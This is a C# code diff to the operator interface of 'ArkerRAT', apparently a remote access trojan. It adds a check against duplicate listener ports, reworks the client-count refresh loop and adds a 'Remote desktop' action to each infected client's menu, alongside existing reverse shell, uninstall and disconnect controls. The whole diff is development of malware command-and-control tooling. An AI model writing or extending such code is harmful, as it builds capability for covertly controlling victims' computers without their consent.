@@ -44,25 +44,25 @@ namespace ArkerRAT1
         int oldCount = 0;
         private void UpdateUI()
         {
-            while (true)
+            while(true)            
             {
                 if (ArkerRATServerMechanics.rATClients.Count() != oldCount)
                 {
                     oldCount = ArkerRATServerMechanics.rATClients.Count();
-                    this.Dispatcher.Invoke(() =>
+                    this.Dispatcher.BeginInvoke(new Action(() =>
                     {
                         clientAmountLabel.Content = ArkerRATServerMechanics.rATClients.Count();
                         serverAmountLabel.Content = 0;
-                    });
+                    }));
                 }
 
-                Thread.Sleep(1000);
-                this.Dispatcher.Invoke(() =>
+                this.Dispatcher.BeginInvoke(new Action(() =>
                 {
                     //ArkerRATServerMechanics.port = Convert.ToInt32(portInput.Text);
                     LoadCLients();
-                });
-            }
+                }));
+                Thread.Sleep(1000);
+            };
         }
 
         private void TabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
@@ -168,21 +168,25 @@ namespace ArkerRAT1
         }
 
         private async void Listener(object sender, RoutedEventArgs e)
-        {
-            Button serverButton = new Button();
-            serverButton.Width = 700;
-            serverButton.Height = 50;
-            System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
-            System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
-            serverButton.BorderBrush = new SolidColorBrush(arkerPurple);
-            serverButton.Foreground = new SolidColorBrush(arkerPurple);
-            serverButton.Background = new SolidColorBrush(arkerGrey);
-            serverButton.Content = portInput.Text;
-            serverButton.Click += new RoutedEventHandler(RemoveServer);
-            serverButton.Tag = Convert.ToInt32(portInput.Text);
-            loadServers.Items.Add(serverButton);
-            ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
-            ArkerRATServerMechanics.StartServer();
+        {   
+            if (!ArkerRATServerMechanics.ports.Contains(Convert.ToInt32(portInput.Text)))
+            {
+                Button serverButton = new Button();
+                serverButton.Width = 700;
+                serverButton.Height = 50;
+                System.Windows.Media.Color arkerGrey = System.Windows.Media.Color.FromRgb(18, 17, 20);
+                System.Windows.Media.Color arkerPurple = System.Windows.Media.Color.FromRgb(153, 102, 255);
+                serverButton.BorderBrush = new SolidColorBrush(arkerPurple);
+                serverButton.Foreground = new SolidColorBrush(arkerPurple);
+                serverButton.Background = new SolidColorBrush(arkerGrey);
+                serverButton.Content = portInput.Text;
+                serverButton.Click += new RoutedEventHandler(RemoveServer);
+                serverButton.Tag = Convert.ToInt32(portInput.Text);
+                loadServers.Items.Add(serverButton);
+                ArkerRATServerMechanics.ports.Add(Convert.ToInt32(portInput.Text));
+                ArkerRATServerMechanics.StartServer();
+            }
+
         }
 
         private async void RemoveServer(object sender, RoutedEventArgs e)
@@ -220,11 +224,23 @@ namespace ArkerRAT1
                 Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\remove.png"))
             };
 
+            MenuItem remoteDesktop = new MenuItem();
+            remoteDesktop.Header = "Remote desktop";
+            remoteDesktop.Icon = new System.Windows.Controls.Image
+            {
+                Stretch = Stretch.Fill,
+                Source = new BitmapImage(new Uri("C:\\Users\\Alexander\\source\\repos\\ArkerRatWpfVersion\\ArkerRatWpfVersion\\icons\\desktop.png"))
+            };
+
             clientButton.ContextMenu = new ContextMenu();
             clientButton.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
             clientButton.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));
 
+            //Tools
             clientButton.ContextMenu.Items.Add(reversShellButton);
+            clientButton.ContextMenu.Items.Add(remoteDesktop);
+
+            //Dieconnect
             clientButton.ContextMenu.Items.Add(unInstall);
             clientButton.ContextMenu.Items.Add(disconnect);
 
@@ -237,6 +253,7 @@ namespace ArkerRAT1
                     reversShellButton.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartReverseShell);
                     unInstall.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Uninstall);
                     disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
+                    remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
                 }
             }
         }
